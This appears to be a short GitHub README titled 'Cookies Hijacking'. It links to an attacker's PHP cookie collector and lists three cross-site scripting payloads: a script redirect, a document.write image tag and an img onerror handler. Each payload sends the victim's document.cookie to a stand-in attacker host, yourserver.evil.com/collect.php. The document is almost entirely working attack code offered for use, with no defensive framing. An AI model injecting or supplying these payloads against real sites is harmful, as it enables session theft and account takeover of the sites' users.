# Cookies Hijacking 

## Server Code : [Link](https://github.com/Taylorcho123/Cookies-Hijacking/blob/master/get_cookies.php)

## XSS Code :
1. 
#### Send client's cookie as a GET parameter.
#### also, redirect to server page of the attacker.
    <script>document.location="http://yourserver.evil.com/collect.php?cookie="+document.cookie;</script>

2. 
#### Using img tag and send the cookie.
#### No redirection.
    document.write('<img src="http://yourserver.evil.com/collect.php?cookie=' + document.cookie + '" />')

    <img src=x onerror=this.src='http://yourserver.evil.com/collect.php?cookie='+document.cookie>